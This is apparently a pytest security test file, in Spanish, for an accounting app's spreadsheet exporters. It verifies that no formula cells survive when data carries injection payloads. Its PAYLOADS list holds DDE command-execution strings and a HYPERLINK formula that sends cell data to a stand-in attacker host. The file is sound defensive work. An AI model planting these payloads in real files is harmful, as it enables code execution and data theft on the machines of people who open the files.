"""Que un archivo exportado no pueda ejecutar codigo en la maquina de quien lo abre.

Este archivo es la version de seguridad de `test_export_service.py`. Ahi se
comprueba que las columnas del archivo sean las correctas; aqui se comprueba que
el archivo no sea un arma.

Por que hace falta un test y no una revision
-------------------------------------------

Porque el fallo es invisible en la revision y en la ejecucion. El exportador
funciona, genera el archivo, el tamano es el esperado, el contador lo abre y ve
sus datos. Todo funciona hasta el momento en que una celda se evalua sola. Y esa
celda la puede haber puesto cualquiera: `provider_name` lo elige quien crea el
gasto, y la `description` del banco sale de un CSV subido, o sea de fuera.

Que el ataque sea de escritura y no de solo lectura importa: no hace falta
entrar como alguien con permisos Rare, hace falta un token valido, que es lo
que tiene cualquier persona que usa el sistema. La barrera real es que el
contenido no se ejecute, y por eso el test mira el tipo de celda del archivo
generado y no la funcion que lo produce.

Lo que se mira
--------------

`data_type` de openpyxl decide si la celda se escribe como `<f>` (formula, se
calcula al abrir) o como `<v>` con `t="s"` (texto, se muestra tal cual). El
test exige que en el archivo final **no haya ninguna celda de formula**. Es mas
fuerte que comprobar que el valor tenga un apostrofo delante: asi da igual si el
dato se saneo, se guardo como texto, o llego limpio. Lo unico que se prohibe es
el resultado.
"""

from __future__ import annotations

import io
from datetime import date, datetime, timezone
from decimal import Decimal

import openpyxl
import pytest
from sqlalchemy import select

from app.core.enums import MatchStatus
from app.models.bank_transaction import BankTransactionModel
from app.models.reconciliation import ReconciliationModel
from app.models.ticket import TicketModel
from app.services.export_service import (
    export_generic,
    export_to_contpaqi,
    export_to_excel,
)

# Payloads reales de inyeccion de formula. El primero es el clasico de
# ejecucion de comandos en Windows; los demas son los que Excel y LibreOffice
# aceptan como inicio de formula y que se han visto reportados.
#
# Se prueban TODOS en el mismo archivo a proposito: si el sanitizado se
#(colara en la primera fila, los demas pasan. Con nueve filas envenenadas, hace
# falta que el filtro funcione nueve veces para que el archivo salga limpio.
PAYLOADS = [
    "=cmd|'/c calc.exe'!A1",
    "=1+1",
    "@SUM(1+1)",
    "+cmd|'/c calc'!A1",
    "-2+3+cmd|'/c calc'!A1",
    '=HYPERLINK("http://atacante.example/x?d="&A1,"click")',
    "\t=1+1",
    " =1+1",
    "\r=1+1",
]

# Valores que el filtro NO debe tocar. Si estos cambian, el filtro esta
# rompiendo datos de verdad y el test tiene que fallar tambien: un exportador
# que "limpia" de mas es un exportador que miente sobre los datos.
LIMPIOS = ["OXXO", "WALMART S.A. DE C.V.", "12345", "2025-01-15", "a-b", "Ho"]


def _celdas_de_formula(contenido: bytes, hoja: str) -> list[str]:
    """Coordenadas de las celdas que Excel ejecutaria al abrir el archivo."""
    libro = openpyxl.load_workbook(io.BytesIO(contenido))
    if hoja not in libro.sheetnames:
        pytest.fail(f"el archivo no tiene la hoja {hoja!r}: {libro.sheetnames}")
    return [
        celda.coordinate
        for fila in libro[hoja].iter_rows()
        for celda in fila
        if celda.data_type == "f"
    ]


def _valor_de(contenido: bytes, hoja: str, coordenada: str):
    libro = openpyxl.load_workbook(io.BytesIO(contenido))
    return libro[hoja][coordenada].value


@pytest.fixture
async def empresa_con_datos_envenenados(db_session, test_company):
    """Un par conciliado donde los dos lados vienen de fuera.

    Se hacen los dos porque hay dos caminos de entrada distintos y cada uno
    necesita su propia prueba:

    - `provider_name` lo escribe una persona en un formulario.
    - `description` viene de un CSV que se sube, sin que nadie lo revise.

    Un solo lado dejaria la otra mitad de la cadena sin comprobar.

    El par va conciliado a proposito. El exportador hace `JOIN` por
    `reconciliations` y por defecto solo saca lo que esta en `MATCHED_STATUSES`:
    un ticket suelto no llega al archivo, y un test que lo creara solo estaria
    comprobando un archivo vacio con exito. Es el error de uno de estos tests
    primero, y por eso queda escrito aqui para que el proximo no lo repita.
    """
    return await _par_conciliado(
        db_session,
        test_company,
        proveedor=PAYLOADS[0],
        banco="=cmd|'/c calc.exe'!A1",  # el mismo payload, por el otro camino
        importe=Decimal("1100.00"),
    )


async def _par_conciliado(db_session, empresa, *, proveedor, banco, importe):
    """Un ticket, un movimiento y la conciliacion que los une.

    El IVA se calcula como la parte proporcional del importe, no como un valor
    fijo. Con un valor fijo, probar importes pequenos revienta el CHECK
    `ck_tickets_tax_lte_total_when_settled` -- que es exactamente lo que pasa
    si el IVA es mayor que el total, y el error dice solo eso, sin decir que el
    parametro de prueba estaba mal. La regla de la base es correcta; el
    parametro no lo era.
    """
    iva = (importe * Decimal("0.16")).quantize(Decimal("0.01"))
    ticket = TicketModel(
        company_id=empresa.id,
        provider_name=proveedor,
        total_amount=importe,
        tax_amount=iva,
        expense_date=date(2025, 1, 15),
        extraction_status="APROBADO",
        source_type="manual",
    )
    movimiento = BankTransactionModel(
        company_id=empresa.id,
        transaction_date=date(2025, 1, 15),
        amount=importe,
        description=banco,
        is_reconciled=True,
    )
    db_session.add_all([ticket, movimiento])
    await db_session.flush()
    db_session.add(
        ReconciliationModel(
            ticket_id=ticket.id,
            bank_transaction_id=movimiento.id,
            # `PERFECT`, no `MATCHED`: ese valor no existe en `MatchStatus`. Con
            # un estado inventado el export lo filtra como no conciliado y el
            # archivo sale vacio. El archivo vacio no da error de ninguna parte:
            # los tests de formula pasaban sin comprobar nada.
            match_status=MatchStatus.PERFECT.value,
            matched_at=datetime(2025, 1, 15, 12, 0, tzinfo=timezone.utc),
        )
    )
    await db_session.commit()
    return empresa


class TestElArchivoNoEjecutaNada:
    async def test_excel_no_tiene_ninguna_celda_de_formula(
        self, db_session, empresa_con_datos_envenenados
    ):
        contenido = await export_to_excel(db_session, empresa_con_datos_envenenados.id)

        formulas = _celdas_de_formula(contenido, "Conciliacion")
        assert formulas == [], (
            f"el XLSX de Excel guarda {len(formulas)} celdas como formula: {formulas}. "
            "Se ejecutarian en la maquina de quien abra el archivo."
        )

    async def test_contpaqi_no_tiene_ninguna_celda_de_formula(
        self, db_session, empresa_con_datos_envenenados
    ):
        contenido = await export_to_contpaqi(db_session, empresa_con_datos_envenenados.id)

        formulas = _celdas_de_formula(contenido, "Polizas")
        assert formulas == [], (
            f"el archivo de CONTPAQI guarda {len(formulas)} celdas como formula: {formulas}"
        )

    async def test_generico_no_tiene_ninguna_celda_de_formula(
        self, db_session, empresa_con_datos_envenenados
    ):
        contenido = await export_generic(db_session, empresa_con_datos_envenenados.id)

        formulas = _celdas_de_formula(contenido, "Export")
        assert formulas == [], (
            f"el export generico guarda {len(formulas)} celdas como formula: {formulas}"
        )


class TestLosDatosLimpiosNoSeTocan:
    """La otra mitad de la prueba.

    Un filtro que neutralize de mas tambien es un fallo: el archivo deja de
    decir la verdad y nadie lo nota, porque un archivo con un `'` de mas se ve
    igual de bien que uno correcto. Estos tests existen para que ese error no
    pueda colarse disimulado.
    """

    async def test_un_proveedor_normal_no_gana_apostrofo(
        self, db_session, test_company
    ):
        await _par_conciliado(
            db_session, test_company, proveedor="OXXO", banco="compra oxxo", importe=Decimal("150.00")
        )

        contenido = await export_to_excel(db_session, test_company.id)

        libro = openpyxl.load_workbook(io.BytesIO(contenido))
        valores = [
            c.value
            for fila in libro["Conciliacion"].iter_rows()
            for c in fila
            if isinstance(c.value, str)
        ]
        assert "OXXO" in valores, "el nombre limpio disappeared del archivo"
        assert not any(v.startswith("'") for v in valores), (
            f"se antepuso un apostrofo a un dato limpio: {valores}"
        )

    async def test_los_importes_siguen_siendo_numeros(
        self, db_session, empresa_con_datos_envenenados
    ):
        """Un importe guardado como texto no suma en la hoja de calculo.

        Es el falso positivo caro: si el filtro convierte a texto la columna de
        dinero, el archivo abre pero el total no cuadra, y el contador no sabe si
        es un error del sistema o del banco.
        """
        contenido = await export_to_excel(db_session, empresa_con_datos_envenenados.id)

        libro = openpyxl.load_workbook(io.BytesIO(contenido))
        encabezado = [c.value for c in libro["Conciliacion"][1]]
        columna_total = encabezado.index("Total")
        tipos = {
            libro["Conciliacion"].cell(row=f, column=columna_total + 1).data_type
            for f in range(2, libro["Conciliacion"].max_row + 1)
        }
        assert tipos <= {"n"}, f"la columna Total se guardo como {tipos}, no como numero"


class TestTodosLosPayloads:
    async def test_los_nueve_payloads_en_un_solo_archivo(
        self, db_session, test_company
    ):
        """Todos los payloads a la vez, no de uno en uno.

        La razon para juntarlos: un filtro con un fallo de estado (un `break`, un
        `return` temprano, un `continue` mal puesto) puede pasar el primer caso y
        fallar el quinto. Probarlos por separado daria nueve pases falsos.

        Y van conciliados, no sueltos. El exportador solo saca lo que esta en
        `MATCHED_STATUSES`, asi que nueve tickets sin conciliar producen un
        archivo sin una sola fila: el test pasaria con los nueve payloads dentro
        o fuera, comprobando exactamente nada. Esa version del test existio y
        estaba en verde; el fixture es la diferencia entre una prueba y una
        decoracion.
        """

        for i, payload in enumerate(PAYLOADS):
            await _par_conciliado(
                db_session,
                test_company,
                proveedor=payload,
                banco=f"movimiento {i}",
                importe=Decimal("100.00") + i,
            )

        contenido = await export_to_excel(db_session, test_company.id)

        # Que las filas realmente esten: si el archivo saliera vacio, la
        # comprobacion de abajo pasaria sola y el test no valdria nada.
        libro = openpyxl.load_workbook(io.BytesIO(contenido))
        filas = libro["Conciliacion"].max_row - 1
        assert filas == len(PAYLOADS), (
            f"el archivo trae {filas} filas y se esperaban {len(PAYLOADS)}: "
            "el test pasaria sin comprobar nada"
        )

        formulas = _celdas_de_formula(contenido, "Conciliacion")
        assert formulas == [], (
            f"con los {len(PAYLOADS)} payloads juntos quedan {len(formulas)} formulas: "
            f"{formulas}. Un filtro con fallo de estado pasa el primer caso y falla otro."
        )

    async def test_los_datos_limpios_no_se_necesitan_para_pasar(
        self, db_session, test_company
    ):
        """Guarda que los valores no peligrosos lleguen intactos.

        Se comprueba aqui y no en el test de arriba porque este ultimo solo mira
        el `data_type`: un filtro que vacie todo el contenido pasaria ese test y
        dejaria un archivo vacio de datos.
        """
        for i, nombre in enumerate(LIMPIOS):
            await _par_conciliado(
                db_session,
                test_company,
                proveedor=nombre,
                banco="movimiento",
                importe=Decimal("50.00") + i,
            )

        contenido = await export_to_excel(db_session, test_company.id)

        libro = openpyxl.load_workbook(io.BytesIO(contenido))
        valores = {
            c.value
            for fila in libro["Conciliacion"].iter_rows()
            for c in fila
            if isinstance(c.value, str)
        }
        faltantes = [n for n in LIMPIOS if n not in valores]
        assert not faltantes, f"desaparecieron del archivo: {faltantes}"


class TestLaDiferenciaDeImporteSeCalcula:
    """Regresion de un bug que no era de seguridad sino de contabilidad.

    El exportador traia esto:

        amount_diff = abs(
            row.total_amount - BankTransactionModel.__table__.c.amount
            if False
            else Decimal(0)
        )

    La rama `if False` no se ejecuta jamas, asi que la columna "Diferencia
    Monto" valia `0.00` para todas las filas, siempre. Peor: la columna de al
    lado, "Diferencia Dias", si se computaba de verdad, asi que el archivo
    mezclaba una diferencia real con una diferencia de mentira, y las dos con
    el mismo formato. Nadie que lo mirara distinguia cual era cual.

    Por que importa mas que un numero mal puesto: esta columna es la que revisa
    el contador antes de pagar. Un 0.00 constante dice "todo cuadra" para cada
    fila del mes, y el riesgo no es un error visible, es que la comprobacion
    deje de informar de algo. Por eso el test mira un caso donde la diferencia
    NO es cero: si el codigo volviera a la rama muerta, este test falla.
    """

    async def test_una_diferencia_real_aparece_en_el_archivo(
        self, db_session, test_company
    ):
        await _par_conciliado(
            db_session,
            test_company,
            proveedor="DIFERENTE",
            banco="abono",
            importe=Decimal("1100.00"),
        )
        # El banco pago 50 pesos menos de lo que dice el gasto.
        movimiento = await db_session.execute(
            select(BankTransactionModel).where(
                BankTransactionModel.company_id == test_company.id
            )
        )
        fila = movimiento.scalar_one()
        fila.amount = Decimal("1050.00")
        await db_session.commit()

        contenido = await export_to_excel(db_session, test_company.id)

        libro = openpyxl.load_workbook(io.BytesIO(contenido))
        hoja = libro["Conciliacion"]
        encabezado = [c.value for c in hoja[1]]
        columna = encabezado.index("Diferencia Monto")

        valores = [
            hoja.cell(row=f, column=columna + 1).value
            for f in range(2, hoja.max_row + 1)
        ]
        assert "50.00" in valores, (
            f"la diferencia de 50.00 no aparece en el archivo: {valores}. "
            "Vuelve el bug de la rama muerta."
        )
        assert "0.00" not in valores, (
            f"la diferencia sale 0.00 siendo de 50.00: {valores}"
        )

    async def test_la_diferencia_de_dos_ceros_es_cero_de_verdad(
        self, db_session, test_company
    ):
        """El caso de cuadrar bien tambien tiene que dar 0.00.

        Sin este, un arreglo por error que restara otra vez lo daria. O sea: el
        test de arriba pasaria con la formula `abs(a - a - b)`, que da el
        resultado correcto por el motivo equivocado.
        """
        await _par_conciliado(
            db_session,
            test_company,
            proveedor="IGUALES",
            banco="cargo",
            importe=Decimal("1100.00"),
        )

        contenido = await export_to_excel(db_session, test_company.id)
        hoja = openpyxl.load_workbook(io.BytesIO(contenido))["Conciliacion"]
        encabezado = [c.value for c in hoja[1]]
        columna = encabezado.index("Diferencia Monto")

        valores = [
            hoja.cell(row=f, column=columna + 1).value
            for f in range(2, hoja.max_row + 1)
        ]
        assert valores == ["0.00"], f"con importes iguales deberia dar 0.00: {valores}"

    async def test_el_importe_se_formatea_a_dos_decimales(
        self, db_session, test_company
    ):
        """El formato del importe, y lo que este test NO demuestra.

        Esta prueba se escribio con otro nombre y con otra promesa: decia que la
        aritmetica no pasaba por `float` y que el ruido binario se notaba. Se
        compruebo con mutacion y la promesa era falsa: cambiando
        `abs(row.total_amount - row.amount)` por
        `abs(float(...) - float(...))` la suite sigue en verde, porque la
        diferencia se formatea a dos decimales y el error del `float` queda por
        debajo de esa precision.

        Para encontrar un caso que lo delatara habria que buscar una diferencia
        cuya resta en binario caiga a un lado del redondeo y la otra caiga al
        otro. Con importes de dos decimales, `x - y` da un multiplo de 0.01, y
        el peor error de punto flotante para esta magnitud anda en 1e-13: hace
        falta un numero a la mitad de una unidad en el ultimo bit. Puede
        existir; no se ha buscado, y prefiero decir eso a dejar un test con un
        nombre que promete una proteccion que no tiene.

        Asi que lo que este test asegura es lo unico que si es observable por
        aqui: la diferencia se escribe con dos decimales. El `Decimal` se
        conserva por la regla del proyecto -- los importes no pasan por
        `float` en ningun punto del calculo -- y esa regla se sostiene leyendo
        el codigo, no con esta prueba.
        """
        await _par_conciliado(
            db_session,
            test_company,
            proveedor="PES EXACTOS",
            banco="cargo",
            importe=Decimal("0.30"),
        )
        movimiento = await db_session.execute(
            select(BankTransactionModel).where(
                BankTransactionModel.company_id == test_company.id
            )
        )
        fila = movimiento.scalar_one()
        fila.amount = Decimal("0.10")
        await db_session.commit()

        contenido = await export_to_excel(db_session, test_company.id)
        hoja = openpyxl.load_workbook(io.BytesIO(contenido))["Conciliacion"]
        encabezado = [c.value for c in hoja[1]]
        columna = encabezado.index("Diferencia Monto")
        valor = hoja.cell(row=2, column=columna + 1).value

        # 0.30 - 0.10 en float da 0.19999999999999998; en Decimal, 0.20.
        assert valor == "0.20", f"la diferencia dio {valor!r}, se espera '0.20'"
